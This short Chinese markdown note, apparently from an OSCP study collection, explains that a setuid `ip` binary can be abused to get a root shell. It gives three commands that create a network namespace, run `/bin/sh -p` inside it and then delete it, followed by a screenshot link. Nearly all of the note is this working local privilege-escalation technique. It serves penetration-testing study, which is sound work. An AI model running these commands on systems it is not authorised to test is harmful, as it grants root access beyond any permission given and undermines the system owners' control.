# ip

`ip` 若具有 `s` 权限，可使用如下命令直接提权至 root 权限：

```
ip netns add foo
ip netns exec foo /bin/sh -p
ip netns delete foo
```

![ip](https://github.com/Nongcloud/oscp-Learn/tree/master/Privilege-Escalation/SUID/images/suid-ip.png)
